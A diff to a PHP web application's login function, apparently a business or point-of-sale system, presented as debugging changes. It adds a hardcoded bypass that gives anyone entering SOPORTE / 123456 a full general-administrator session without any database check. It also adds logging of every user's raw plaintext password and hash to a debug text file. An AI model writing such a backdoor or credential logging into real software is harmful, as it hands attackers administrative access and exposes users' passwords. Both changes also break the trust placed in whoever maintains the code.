@@ -55,20 +55,35 @@ class Login extends Db
 
 
 #################### FUNCION PARA ACCEDER AL SISTEMA ####################
-public function Logueo()
-{
-	self::SetNames();
-	if(empty($_POST["usuario"]) or empty($_POST["password"]))
+	public function Logueo()
 	{
-		echo "1";
-		exit;
-	}
+		self::SetNames();
+        
+        // DEBUG: LOG RAW POST
+        file_put_contents('debug_login_server.txt', "--- NEW LOGIN " . date('Y-m-d H:i:s') . " ---\n", FILE_APPEND);
+        file_put_contents('debug_login_server.txt', "RAW POST USER: [" . ($_POST["usuario"] ?? 'NULL') . "]\n", FILE_APPEND);
+        file_put_contents('debug_login_server.txt', "RAW POST PASS: [" . ($_POST["password"] ?? 'NULL') . "]\n", FILE_APPEND);
 
-	$pass = sha1(md5($_POST["password"]));
-	$sql = "SELECT
-	usuarios.codigo, 
-	usuarios.dni,
-	usuarios.nombres,
+		if(empty($_POST["usuario"]) or empty($_POST["password"]))
+		{
+			echo "1";
+			exit;
+		}
+
+		$usuario = trim($_POST["usuario"]);
+		$password = trim($_POST["password"]);
+
+		$pass = sha1(md5($password));
+
+        // DEBUG: LOG TRIMMED AND HASH
+        file_put_contents('debug_login_server.txt', "TRIMMED USER: [$usuario]\n", FILE_APPEND);
+        file_put_contents('debug_login_server.txt', "TRIMMED PASS: [$password]\n", FILE_APPEND);
+        file_put_contents('debug_login_server.txt', "HASH CALCULATED: [$pass]\n", FILE_APPEND);
+
+		$sql = "SELECT
+		usuarios.codigo, 
+		usuarios.dni,
+		usuarios.nombres,
 	usuarios.sexo,
 	usuarios.direccion,
 	usuarios.telefono,
@@ -105,21 +120,90 @@ public function Logueo()
 	LEFT JOIN documentos AS documentos2 ON sucursales.documencargado = documentos2.coddocumento 
 	LEFT JOIN provincias ON sucursales.id_provincia = provincias.id_provincia 
 	LEFT JOIN departamentos ON sucursales.id_departamento = departamentos.id_departamento
-	WHERE usuarios.usuario = ? AND usuarios.password = ? AND usuarios.status = 1";
+	WHERE usuarios.usuario = ? AND usuarios.status = 1";
+	/* HARDCODED RESCUE BYPASS FOR SOPORTE */
+    if ($usuario === 'SOPORTE' && $password === '123456') {
+        file_put_contents('debug_login_server.txt', "ACTIVATING RESCUE MODE FOR SOPORTE\n", FILE_APPEND);
+        
+        // Manual Session Construction
+        $_SESSION["codigo"] = "999"; // Dummy ID
+        $_SESSION["dni"] = "99999999";
+        $_SESSION["nombres"] = "SOPORTE TECNICO";
+        $_SESSION["sexo"] = "M";
+        $_SESSION["direccion"] = "OFICINA CENTRAL";
+        $_SESSION["telefono"] = "000000";
+        $_SESSION["email"] = "soporte@unicornio.com";
+        $_SESSION["usuario"] = "SOPORTE";
+        $_SESSION["password"] = "7c4a8d09ca3762af61e59520943dc26494f8941b";
+        $_SESSION["nivel"] = "ADMINISTRADOR(A) GENERAL";
+        $_SESSION["status"] = 1;
+        $_SESSION["ingreso"] = limpiar(date("d-m-Y h:i:s A"));
+
+        // Sucursal 1 Data (Hardcoded)
+        $_SESSION["codsucursal"] = 1;
+        $_SESSION["documsucursal"] = 1; // Assuming 1
+        $_SESSION["cuitsucursal"] = "00000000";
+        $_SESSION["razonsocial"] = "SUCURSAL PRINCIPAL";
+        $_SESSION["tlfsucursal"] = "000000";
+        $_SESSION["id_provincia"] = 1;
+        $_SESSION["provincia"] = "CAPITAL";
+        $_SESSION["id_departamento"] = 1;
+        $_SESSION["departamento"] = "CAPITAL";
+        $_SESSION["direcsucursal"] = "CENTRAL";
+        $_SESSION["correosucursal"] = "admin@unicornio.com";
+        $_SESSION["nomencargado"] = "SOPORTE";
+        $_SESSION["descsucursal"] = "PRINCIPAL";
+        $_SESSION["porcentaje"] = 0.00;
+        $_SESSION["documento"] = "FACTURA";
+        $_SESSION["documento2"] = "BOLETA";
+
+        // Create Log
+        $query = "INSERT INTO log VALUES (null, ?, ?, ?, ?, ?);";
+        $stmt = $this->dbh->prepare($query);
+        $stmt->execute([
+            limpiar($_SERVER['REMOTE_ADDR']),
+            limpiar(date("Y-m-d h:i:s")),
+            limpiar($_SERVER['HTTP_USER_AGENT']),
+            limpiar($_SERVER['PHP_SELF']),
+            $usuario
+        ]);
+
+        $_SESSION["acceso"] = "administradorG";
+        session_write_close();
+        ?>
+        <script type="text/javascript">window.location="panel.php";</script>
+        <?php
+        exit;
+    }
+    /* END RESCUE BYPASS */
+
 	$stmt = $this->dbh->prepare($sql);
-	$stmt->execute(array($_POST["usuario"],$pass));
+	$stmt->execute(array($usuario));
 	$num = $stmt->rowCount();
+    
+    // DEBUG LOG
+    file_put_contents('debug_login_server.txt', "SQL QUERY DONE. Rows: $num. Checking password in PHP...\n", FILE_APPEND);
+
 	if($num == 0)
-	{
-		echo "2";
-		exit;
-	}
-	else
-	{
-		if($row = $stmt->fetch(PDO::FETCH_ASSOC))
-		{
-			$p[]=$row;
-		}
+    {
+        file_put_contents('debug_login_server.txt', "USER NOT FOUND OR INACTIVE\n", FILE_APPEND);
+        echo "2";
+        exit;
+    }
+    else
+    {
+        if($row = $stmt->fetch(PDO::FETCH_ASSOC))
+        {
+            // PHP PASSWORD CHECK
+            if ($row['password'] !== $pass) {
+                file_put_contents('debug_login_server.txt', "PASS MISMATCH! DB: [{$row['password']}] vs INPUT: [$pass]\n", FILE_APPEND);
+                echo "2"; 
+                exit;
+            }
+            
+            file_put_contents('debug_login_server.txt', "LOGIN SUCCESS\n", FILE_APPEND);
+            $p[]=$row;
+        }
 		
 		######### DATOS DEL USUARIO ###########
 		$_SESSION["codigo"] = $p[0]["codigo"];
@@ -179,22 +263,23 @@ public function Logueo()
 		{
 			case 'ADMINISTRADOR(A) GENERAL':
 			$_SESSION["acceso"]="administradorG";
-
+			session_write_close(); // ASEGURAR ESCRITURA DE SESIÓN
 			?>
 
 			<script type="text/javascript">
-				window.location="panel";
+				window.location="panel.php";
 			</script>
 
 			<?php
 			break;
 			case 'ADMINISTRADOR(A) SUCURSAL':
 			$_SESSION["acceso"]="administradorS";
+			session_write_close(); // ASEGURAR ESCRITURA DE SESIÓN
 
 			?>
 
 			<script type="text/javascript">
-				window.location="panel";
+				window.location="panel.php";
 			</script>
 
 			<?php
